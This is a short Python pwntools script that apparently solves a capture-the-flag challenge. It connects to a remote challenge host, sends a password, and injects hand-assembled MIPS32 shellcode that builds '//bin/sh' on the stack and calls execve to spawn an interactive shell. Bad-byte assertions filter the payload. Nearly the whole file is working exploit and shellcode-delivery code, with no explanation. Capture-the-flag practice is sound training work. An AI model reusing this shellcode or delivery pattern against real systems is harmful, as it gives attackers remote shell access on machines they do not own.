from pwn import *
context.update(arch='mips', os='linux', bits=32, endian='little')
context.log_level = 'debug'
r = remote('mipscode-level1.chal.cyberjousting.com', 1357)
#r = gdb.debug('./mipscode_level2', 'b main\nc')
#r = process('./mipscode_level2')
# https://fireshellsecurity.team/writing-a-shellcode-for-mips32/
shellcode = '''
  lui $t7, 0x6962 
  ori $t7, $t7,0x2f2f 
  lui $t6, 0x6873
  ori $t6, $t6, 0x2f6e 
  sw $t7, -8($sp)
  sw $t6, -4($sp)
  addiu $a0, $sp, -8
  slti $a1, $zero, -1
  slti $a2, $zero, -1
  li $v0, 4011
  syscall 0x040405
'''
payload = asm(shellcode)
print(len(payload), payload)
assert b'\x00' not in payload 
assert b'\x20' not in payload 
assert b'\x09' not in payload  
assert b'\x0a' not in payload 
assert b'\x0b' not in payload 
assert b'\x0c' not in payload 
assert b'\x0d' not in payload
#process(make_elf(payload, extract=False)).interactive()
r.recvuntil(b'password: ')
r.sendline(b'8ff28f88f91b8f93006ed39cba6217e2860cb2c004eb490a1b16aeb2948164d6')
r.recvuntil(b'Shellcode> ')
r.send(payload)
r.interactive()

